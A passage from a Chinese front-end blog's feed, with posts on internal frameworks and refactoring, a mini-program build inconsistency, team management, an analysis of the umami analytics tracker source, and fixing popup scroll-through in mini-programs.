title="内部框架是个p"></a>内部框架是个p</h4><p>见过太多的内部库，内部框架了，没有一个，是的没有一个，给我比较好的印象。</p><ol><li>你的同事水平不一定比你强，见过大量错别字的内部库 :(</li><li>内部框架服务于特定领域，有它自身的局限</li><li>内部框架往往公司的人事变迁，就没有人维护了，很多内部框架都是一两个人维护，有的内部看源码都很麻烦，单点风险太高。</li><li>没有银弹，多少库，框架，只是拿着开源的改改，就是内部库了</li></ol><h2 id="保持核心方法的单调性"><a href="#保持核心方法的单调性" class="headerlink" title="保持核心方法的单调性"></a>保持核心方法的单调性</h2><h3 id="http"><a href="#http" class="headerlink" title="http"></a>http</h3><p>在我的项目里面，http 方法是比较核心的方法，初始状态下，有使用全局 http 的，也有直接使用 wx.request 方法的。后续做 token 校验的时候，困难重重，线上总是有大量的失效的 token。所以对所有 http 方法做了要求，全部使用我自己的库 @aocoding/mini-axios，集中处理token更新机制，后续异常逐渐降下来了。</p><h3 id="合理封装，保持简单"><a href="#合理封装，保持简单" class="headerlink" title="合理封装，保持简单"></a>合理封装，保持简单</h3><p>很多按钮点击时候，需要用户高级授权，而高级授权又对应着判断是否已经授权，获取 code，和后端交互等复杂交互。<br>这里我们做了一个全局状态去存储授权，并封装成装饰器，按钮等行动点，可以直接使用装饰器去校验。进入页面时候，也可以使用装饰器去做一定的授权防御。</p><h2 id="正确使用组件"><a href="#正确使用组件" class="headerlink" title="正确使用组件"></a>正确使用组件</h2><p>一般项目其实很难过度组件化，一个页面也就十几个组件。但是我接盘的一个项目，组件的划分匪夷所思。</p><ul><li>外层组件：起初我以为是复用，但是完全没有复用，基本都使用一次，原生小程序，不涉及业务逻辑</li><li>内层组件：涉及业务逻辑，引用外层组件，内部框架</li></ul><p>这样的结果就是你需要在小程序里面跳来跳去，一个页面，组件应该有上百个….虽然业务确实比较复杂，但是咱真的至于这样么…</p><h2 id="整洁代码"><a href="#整洁代码" class="headerlink" title="整洁代码"></a>整洁代码</h2><ol><li>严禁大量的注释（调试）代码存在，必须删除，现在不能和过去告别，以后也会纠缠不清，想看以前的记录，请使用 git</li><li>使用 ts，我们的项目基本都切换到了 ts，http 部分必须要有严格的类型定义，后续很少出现数据层面的bug。ts 不需要学的多深入，去做类型体操，花一周时间认真去学习，就能够应对项目中的绝大部分内容。随着 ts 越写越多，更多的场景也会推着你去学习新的知识。</li></ol><h3 id="重构"><a href="#重构" class="headerlink" title="重构"></a>重构</h3><ol><li>不要怕，甩开膀子就是干！信心比能力更重要，面对屎山，要有不破楼兰誓不还的决心，小步迭代，长期推进，屎山也能变金山。</li><li>长期项目，如果没有一定的重构机制，那一定是屎上堆屎。必须有完善的 review 机制，不合格代码不能因为任何原因合入，必须修改完所有的问题，把这养成习惯，去推动团队的运行。</li><li>重构从主干代码开始，聚合项目中的各种通用方法，业务包装，主干代码串起项目骨架，其他的更多的是业务的填充。业务方面，保持各模块的解耦，公用方法的抽离，一个相对健壮的项目就出来了。</li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;亿级流量的 c 端项目。主体是多个小程序，并且分化为多个版本。除了扯皮拉扯之外，总想聊一聊，不吐不快。&lt;/p&gt;
&lt;h2 id=&quot;保持技术栈的单调性&quot;&gt;&lt;a href=&quot;#保持技术栈的单调性&quot; class=&quot;headerlink&quot; title=&quot;保持技术栈的单调性&quot;&gt;&lt;/a&gt;
      
    
    </summary>
    
    
      <category term="anything" scheme="https://jscoder.com/categories/anything/"/>
    
    
      <category term="项目管理" scheme="https://jscoder.com/tags/%E9%A1%B9%E7%9B%AE%E7%AE%A1%E7%90%86/"/>
    
  </entry>
  
  <entry>
    <title>小程序预览和体验码不一致的坑</title>
    <link href="https://jscoder.com/2022/08/20/front-end/alipay-mini-pkg-builder/"/>
    <id>https://jscoder.com/2022/08/20/front-end/alipay-mini-pkg-builder/</id>
    <published>2022-08-20T14:53:02.000Z</published>
    <updated>2023-10-18T13:26:55.835Z</updated>
    
    <content type="html"><![CDATA[<h2 id="翻车现场"><a href="#翻车现场" class="headerlink" title="翻车现场"></a>翻车现场</h2><p>我们的小程序之前打包都是 ok 的，但是上次发版本，验证发现多处 css 异常。代码回退，使用旧版本的代码故障依旧。并且本地的 ide 打包出来时正常的，只在云端构建时候出现问题。</p><h2 id="快速解决问题"><a href="#快速解决问题" class="headerlink" title="快速解决问题"></a>快速解决问题</h2><p>直觉是存在 css 冲突，为了快速解决问题，把发现的几处修改了。但是还有哪些，挺难发现的，必须找到问题的根本原因。</p><h2 id="问题在哪？"><a href="#问题在哪？" class="headerlink" title="问题在哪？"></a>问题在哪？</h2><p>因为旧版本之前上传是正确的，本次本地都是 ok 的，只在线上出现问题。那么大概率是编译器有更新，本地编译器是随着 ide 发布的，线上可以直接更新。</p><p>我们的 ide 版本是 3.0.2，最新版本的 ide 是 3.1.3，更新最新版本的 ide，问题复现。</p><p>查看 ide 的 mini-pkg-builder hash：</p><p>3.0.2<br>md5: daa0f48beb478e414c8686ba02cc560a<br>sha-256: 5499c3918ab708f6df337abed8a126e9d19293394c746b77846553d2f1caea83</p><p>3.1.3<br>md5: f26ab0d68a13f86377bc6b7805de61ba<br>sha-256: a4b647abbd37776e8b8d1883d179ee6bb64c21f0a7deb7e00e406ae83c1fe561</p><p>编译器确实有变化。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这个问题，真的挺搞的，不声不响更新核心组件，质量如何把关的，如何上线的，有没有开发者通知？</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;翻车现场&quot;&gt;&lt;a href=&quot;#翻车现场&quot; class=&quot;headerlink&quot; title=&quot;翻车现场&quot;&gt;&lt;/a&gt;翻车现场&lt;/h2&gt;&lt;p&gt;我们的小程序之前打包都是 ok 的，但是上次发版本，验证发现多处 css 异常。代码回退，使用旧版本的代码故障依旧。并且本地
      
    
    </summary>
    
    
      <category term="front-end" scheme="https://jscoder.com/categories/front-end/"/>
    
    
      <category term="小程序" scheme="https://jscoder.com/tags/%E5%B0%8F%E7%A8%8B%E5%BA%8F/"/>
    
  </entry>
  
  <entry>
    <title>战争与和平</title>
    <link href="https://jscoder.com/2022/06/26/anything/zhan-zheng-yu-he-ping/"/>
    <id>https://jscoder.com/2022/06/26/anything/zhan-zheng-yu-he-ping/</id>
    <published>2022-06-26T15:30:00.000Z</published>
    <updated>2023-10-18T13:26:55.835Z</updated>
    
    <content type="html"><![CDATA[<p><strong>战争</strong>：项目紧急或复杂<br><strong>和平</strong>：项目不急或简单</p><h2 id="战争"><a href="#战争" class="headerlink" title="战争"></a>战争</h2><p><strong>资源</strong>：战争是资源的消耗战，工作强度往往超过 996，往往我们是极度的缺乏资源，又需要赢下这场战争。在团结内部的同时，也要尽力去争取一切可以争取的资源，比如说，水果零食，加班能不能尽量争取，道义放两旁，利字摆中间。</p><p><strong>代码贡献</strong>：项目紧急或者复杂，就意味着项目之中存在大量有待梳理与优化的点，意味着要投入更多的时间去整合资源、精简需求和迭代方案，个体的代码贡献与整体的效能提升相比，就显得没那么重要了。战争时代，技术主管可以少写、不写代码。</p><p><strong>快速决策</strong>：事情千头万绪，各种人找你，快速决策的基础是必须对项目有深入的理解，不能任凭甲方牵着鼻子走，否则会疲于奔命，要有理有据的说服对方。</p><p><strong>团队</strong>：战争时代，各种会议，对接，会消耗技术主管大量的时间，团队应该在缺少部分管理的情况下自行运作，各自推进项目进度，不能依靠技术主管去做事情的推进。用人所长，发挥团队的最高效能。</p><p><strong>人员</strong>：因为项目的扩张，必然导致人员的扩张，快速筛选人才，挑选人才，团队磨合，对于不能融入团队，传递负能量，无法立即解决眼前问题的，杀伐果断。</p><h2 id="和平"><a href="#和平" class="headerlink" title="和平"></a>和平</h2><p><strong>代码贡献</strong>：项目的稳定期，作为技术攻坚的带头人，引入业界前沿的技术、设计模式或者框架，让战争时代Quick And Dirty的方式和不得不情况下做出的妥协变得优雅又牢固，持续深挖团队的技术护城河，营造团队以精进技术为导向的氛围，培养各个方向顶尖的技术梯队，是和平年代技术主管的使命。</p><p>这个阶段，技术主管应该多写困难的代码，解决共性问题，迎难而上。</p><p><strong>团队</strong>：温情是这个时期的主旋律，给团队明确的技术方向，深挖团队护城河，不断引入最新的技术实践，营造技术氛围。深入了解团队成员的个性与技术擅长，给予适当的引导，和平时期尽量消灭一些浅层次问题，在战争时，才可以用人所长。</p><p><strong>人员</strong>：适合培养新人，磨合团队，培养技术梯队。大型项目可以考虑人员的适度冗余，为战争做准备，避免战争期间大量的人员变动，冲击原有的团队文化，技术阵型。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>技术主管需要有广阔的技术视野，引领团队进步，同时对项目要有细粒度的把控。进能带领团队，迎接一个又一个挑战，退，能够实现复杂的业务逻辑，混口饭吃。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;strong&gt;战争&lt;/strong&gt;：项目紧急或复杂&lt;br&gt;&lt;strong&gt;和平&lt;/strong&gt;：项目不急或简单&lt;/p&gt;
&lt;h2 id=&quot;战争&quot;&gt;&lt;a href=&quot;#战争&quot; class=&quot;headerlink&quot; title=&quot;战争&quot;&gt;&lt;/a&gt;战争&lt;/h2&gt;&lt;p&gt;&lt;str
      
    
    </summary>
    
    
      <category term="anything" scheme="https://jscoder.com/categories/anything/"/>
    
    
      <category term="总结" scheme="https://jscoder.com/tags/%E6%80%BB%E7%BB%93/"/>
    
      <category term="管理" scheme="https://jscoder.com/tags/%E7%AE%A1%E7%90%86/"/>
    
  </entry>
  
  <entry>
    <title>umami 源码分析</title>
    <link href="https://jscoder.com/2022/06/26/front-end/umami/"/>
    <id>https://jscoder.com/2022/06/26/front-end/umami/</id>
    <published>2022-06-26T14:53:02.000Z</published>
    <updated>2023-10-18T13:26:55.839Z</updated>
    
    <content type="html"><![CDATA[<p>umami 不使用 cookie 、localstorage 实现了 uv 识别，符合最新的隐私规范，代码也比较精简。花了一点时间，研究了这部分的实现，还是很有意思的。</p><h2 id="技术框架："><a href="#技术框架：" class="headerlink" title="技术框架："></a>技术框架：</h2><p>next.js + mysql/postgresql<br>整体看下来，nextjs 准备了很多的约定，比如说 api 目录在 <code>pages/api/</code>下面，比如说，<code>pages/api/user.js</code>，nextjs 框架有大量这样的约定。</p><p>个人还是不太习惯这样的框架，总有种不伦不类的感觉，一些小项目可以这样搞，大型项目，还是需要明确的代码分成，封装。</p><h2 id="用户识别"><a href="#用户识别" class="headerlink" title="用户识别"></a>用户识别</h2><p>uv 的核心是去做用户识别，一般会本地存储一个随机的id，每次页面路由变化，上报给后台。<br>而 umami 为了符合一系列的隐私规范，并没有这么做，没有使用 cookie或者 localStorage 。<br>上报路径”pages/api/collect.js”，最终会产生 session 并且通过 session 返回 token 。session 生成方法 <code>getSession</code></p><pre class=" language-js"><code class="language-js"><span class="token keyword">const</span> session_uuid <span class="token operator">=</span> <span class="token function">uuid</span><span class="token punctuation">(</span>website_id<span class="token punctuation">,</span> hostname<span class="token punctuation">,</span> ip<span class="token punctuation">,</span> userAgent<span class="token punctuation">)</span><span class="token punctuation">;</span>session <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token function">createSession</span><span class="token punctuation">(</span>website_id<span class="token punctuation">,</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    session_uuid<span class="token punctuation">,</span>    hostname<span class="token punctuation">,</span>    browser<span class="token punctuation">,</span>    os<span class="token punctuation">,</span>    screen<span class="token punctuation">,</span>    language<span class="token punctuation">,</span>    country<span class="token punctuation">,</span>    device<span class="token punctuation">,</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>这部分代码就比较清楚了，根据网站id，域名，ip，userAgent 生成 session_uuid,然后和数据库通信创建或者使用 session。<br>核心是根据一些列的变量生成一个不变的 uuid，后续用户再次进入页面，根据用户的这些参数，去数据库查询这个 uuid，就实现了用户识别。</p><p>里面也有一些其他的逻辑，比如跨域，忽略本地地址等，但是不影响我们对核心逻辑的理解。</p><h2 id="上报脚本脚本"><a href="#上报脚本脚本" class="headerlink" title="上报脚本脚本"></a>上报脚本脚本</h2><p>上报脚本位置：<code>tracker/index.js</code><br>这个脚本很短，只有短短的225实现了上报功能。</p><pre class=" language-js"><code class="language-js"><span class="token operator">&lt;</span>script <span class="token keyword">async</span> defer data<span class="token operator">-</span>website<span class="token operator">-</span>id<span class="token operator">=</span><span class="token string">"914685a1-8993-4d8c-895b-929c8646e814"</span> src<span class="token operator">=</span><span class="token string">"http://localhost:3000/umami.js"</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre><ul><li>async: async 脚本会在后台加载，并在加载就绪时运行。DOM 和其他脚本不会等待它们，它们也不会等待其它的东西。async 脚本就是一个会在加载完成时执行的完全独立的脚本。</li><li>defer: 特性告诉浏览器不要等待脚本。相反，浏览器将继续处理 HTML，构建 DOM。脚本会“在后台”下载，然后等 DOM 构建完成后，脚本才会执行。</li><li>data-website-id: 网站 id</li></ul><h2 id="挂载"><a href="#挂载" class="headerlink" title="挂载"></a>挂载</h2><pre class=" language-js"><code class="language-js"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>window<span class="token punctuation">.</span>umami<span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> umami <span class="token operator">=</span> eventValue <span class="token operator">=</span><span class="token operator">></span> <span class="token function">trackEvent</span><span class="token punctuation">(</span>eventValue<span class="token punctuation">)</span><span class="token punctuation">;</span>    umami<span class="token punctuation">.</span>trackView <span class="token operator">=</span> trackView<span class="token punctuation">;</span>    umami<span class="token punctuation">.</span>trackEvent <span class="token operator">=</span> trackEvent<span class="token punctuation">;</span>    window<span class="token punctuation">.</span>umami <span class="token operator">=</span> umami<span class="token punctuation">;</span>  <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span></code></pre><p>方法都挂载到 window 上面，后续可以直接调用。</p><h2 id="记录-pv-uv"><a href="#记录-pv-uv" class="headerlink" title="记录 pv uv"></a>记录 pv uv</h2><pre class=" language-js"><code class="language-js"><span class="token keyword">if</span> <span class="token punctuation">(</span>autoTrack <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">trackingDisabled</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// 监听 pushState，replaceState 事件</span>    history<span class="token punctuation">.</span>pushState <span class="token operator">=</span> <span class="token function">hook</span><span class="token punctuation">(</span>history<span class="token punctuation">,</span> <span class="token string">'pushState'</span><span class="token punctuation">,</span> handlePush<span class="token punctuation">)</span><span class="token punctuation">;</span>    history<span class="token punctuation">.</span>replaceState <span class="token operator">=</span> <span class="token function">hook</span><span class="token punctuation">(</span>history<span class="token punctuation">,</span> <span class="token string">'replaceState'</span><span class="token punctuation">,</span> handlePush<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> update <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>      console<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token string">'update'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>document<span class="token punctuation">.</span>readyState <span class="token operator">===</span> <span class="token string">'complete'</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>        console<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token string">'complete'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">trackView</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>cssEvents<span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>          <span class="token function">addEvents</span><span class="token punctuation">(</span>document<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token function">observeDocument</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>      <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token punctuation">;</span>    document<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'readystatechange'</span><span class="token punctuation">,</span> update<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">update</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span></code></pre><p>这里最终会在<code>document.readyState === &#39;complete&#39;</code>时候，去做事件监听绑定等操作，发送第一次页面上报。<br>有一点不理解，为什么已经监听了<code>readystatechange</code>，还是又手动执行了一次<code>update()</code></p><h2 id="监听路由改变"><a href="#监听路由改变" class="headerlink" title="监听路由改变"></a>监听路由改变</h2><pre class=" language-js"><code class="language-js"><span class="token keyword">export</span> <span class="token keyword">const</span> hook <span class="token operator">=</span> <span class="token punctuation">(</span>_this<span class="token punctuation">,</span> method<span class="token punctuation">,</span> callback<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>  <span class="token keyword">const</span> orig <span class="token operator">=</span> _this<span class="token punctuation">[</span>method<span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token operator">...</span>args<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    callback<span class="token punctuation">.</span><span class="token function">apply</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">,</span> args<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> orig<span class="token punctuation">.</span><span class="token function">apply</span><span class="token punctuation">(</span>_this<span class="token punctuation">,</span> args<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token punctuation">;</span></code></pre><p><code>history.pushState</code> hook劫持，为了在原生方法执行前，执行callback。这样实现了对原生 history 的监听。<code>handlePush</code> 方法会执行上报方法 trackView。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>整体代码比较简单，清晰，无侵入性的实现了网站统计。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;umami 不使用 cookie 、localstorage 实现了 uv 识别，符合最新的隐私规范，代码也比较精简。花了一点时间，研究了这部分的实现，还是很有意思的。&lt;/p&gt;
&lt;h2 id=&quot;技术框架：&quot;&gt;&lt;a href=&quot;#技术框架：&quot; class=&quot;headerlin
      
    
    </summary>
    
    
      <category term="front-end" scheme="https://jscoder.com/categories/front-end/"/>
    
    
      <category term="umami" scheme="https://jscoder.com/tags/umami/"/>
    
      <category term="源码" scheme="https://jscoder.com/tags/%E6%BA%90%E7%A0%81/"/>
    
  </entry>
  
  <entry>
    <title>小程序中的滚动穿透</title>
    <link href="https://jscoder.com/2022/04/18/front-end/mini-scroll-through/"/>
    <id>https://jscoder.com/2022/04/18/front-end/mini-scroll-through/</id>
    <published>2022-04-18T14:01:25.000Z</published>
    <updated>2023-10-18T13:26:55.839Z</updated>
    
    <content type="html"><![CDATA[<p>在小程序开发中，弹出层滚动穿透是个比较棘手的问题。如下图，蓝色部分滚动，底部也跟着一起滚动，就是滚动穿透。</p><p>常见的处理方法比如，禁止滚动，并不生效。而给主体加 <code>overflow: hidden</code> 又会导致主体滚动条高度为 0，需要关闭时候记录滚动条位置，体验也不好。</p><p><img src="/images/2022/04/18/16502908272281.jpg"></p><h2 id="touch-action"><a href="#touch-action" class="headerlink" title="touch-action"></a>touch-action</h2><table><thead><tr><th>值</th><th>描述</th></tr></thead><tbody><tr><td>auto</td><td>启用</td></tr><tr><td>none</td><td>禁用</td></tr><tr><td>pan-x</td><td>启用单指水平移动</td></tr><tr><td>pan-y</td><td>启用垂直手势</td></tr><tr><td>manipulation</td><td>浏览器只允许进行滚动和持续缩放操作。任何其它被auto值支持的行为不被支持。启用平移和缩小缩放手势，但禁用其他非标准手势，例如双击以进行缩放。 禁用双击可缩放功能可减少浏览器在用户点击屏幕时延迟生成点击事件的需要。</td></tr><tr><td>pinch-zoom</td><td>启用多手指平移和缩放页面</td></tr><tr><td>pan-left, pan-right,pan-up,pan-down</td><td>启用指定方向滚动开始的单指手势</td></tr></tbody></table><p>在 mask 和 popup 元素上面禁用即可：</p><pre class=" language-css"><code class="language-css"><span class="token number">.</span>mask, <span class="token number">.</span>popup &amp;<span class="token hexcode">#123</span><span class="token punctuation">;</span>    <span class="token property">touch-action</span><span class="token punctuation">:</span> none&amp;<span class="token hexcode">#125</span><span class="token punctuation">;</span></code></pre><p>这里和 overflow 方式类似，都不是特别好的办法，能解决部分问题，但是不完美。</p><p><strong>注意</strong>：这里适合 popup 内部没有滚动的情况</p><h2 id="禁止冒泡和默认行为"><a href="#禁止冒泡和默认行为" class="headerlink" title="禁止冒泡和默认行为"></a>禁止冒泡和默认行为</h2><p>preventDefault：阻止默认滚动动作的执行。<br>stopPropagation: 阻止冒泡，阻止事件由下向上传递。</p><p>实现上，小程序这里需要借助 sjs 的能力来实现：<br>sjs 文件：</p><pre class=" language-js"><code class="language-js"><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span> sjs 文件 <span class="token operator">--</span><span class="token operator">></span><span class="token keyword">function</span> <span class="token function">disableScroll</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>  e<span class="token punctuation">.</span><span class="token function">preventDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">enableScroll</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 阻止冒泡</span>  e<span class="token punctuation">.</span><span class="token function">stopPropagation</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token keyword">export</span> <span class="token keyword">default</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>  disableScroll<span class="token punctuation">,</span>  enableScroll<span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span></code></pre><p>axml文件：</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>import-sjs</span> <span class="token attr-name">from</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>./index.sjs<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>sjs<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>view</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>wrapper<span class="token punctuation">"</span></span> <span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>view</span> <span class="token attr-name"><span class="token namespace">a:</span>for</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>&amp;#123;&amp;#123;[1, 2, 3, 4, 5, 6, 7, 8, 9]&amp;#125;&amp;#125;<span class="token punctuation">"</span></span> <span class="token attr-name"><span class="token namespace">a:</span>for-item</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>i<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>view</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>item<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token entity" title="&#123;">&amp;#123;</span><span class="token entity" title="&#123;">&amp;#123;</span>i<span class="token entity" title="&#125;">&amp;#125;</span><span class="token entity" title="&#125;">&amp;#125;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>view</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>view</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>view</span> <span class="token attr-name">onTouchMove</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>&amp;#123;&amp;#123;sjs.disableScroll&amp;#125;&amp;#125;<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>view</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>mask<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>view</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>popup<span class="token punctuation">"</span></span> <span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>scroll-view</span> <span class="token attr-name">scroll-y</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>popup-scroll<span class="token punctuation">"</span></span> <span class="token attr-name">onTouchMove</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>&amp;#123;&amp;#123;sjs.enableScroll&amp;#125;&amp;#125;<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>view</span> <span class="token attr-name"><span class="token namespace">a:</span>for</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>&amp;#123;&amp;#123;[1, 2, 3, 4, 5, 6, 7, 8, 9]&amp;#125;&amp;#125;<span class="token punctuation">"</span></span> <span class="token attr-name"><span class="token namespace">a:</span>for-item</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>i<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>view</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>item2<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token entity" title="&#123;">&amp;#123;</span><span class="token entity" title="&#123;">&amp;#123;</span>i<span class="token entity" title="&#125;">&amp;#125;</span><span class="token entity" title="&#125;">&amp;#125;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>view</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>view</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>scroll-view</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>view</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>view</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>view</span><span class="token punctuation">></span></span></code></pre><p>或者，我们把阻止默认事件放到 mask 层上面，那么下面的 scroll-veiw 不处理，也能够正常滚动</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>import-sjs</span> <span class="token attr-name">from</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>./index.sjs<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>sjs<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>view</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>wrapper<span class="token punctuation">"</span></span> <span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>view</span> <span class="token attr-name"><span class="token namespace">a:</span>for</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>&amp;#123;&amp;#123;[1, 2, 3, 4, 5, 6, 7, 8, 9]&amp;#125;&amp;#125;<span class="token punctuation">"</span></span> <span class="token attr-name"><span class="token namespace">a:</span>for-item</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>i<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>view</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>item<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token entity" title="&#123;">&amp;#123;</span><span class="token entity" title="&#123;">&amp;#123;</span>i<span class="token entity" title="&#125;">&amp;#125;</span><span class="token entity" 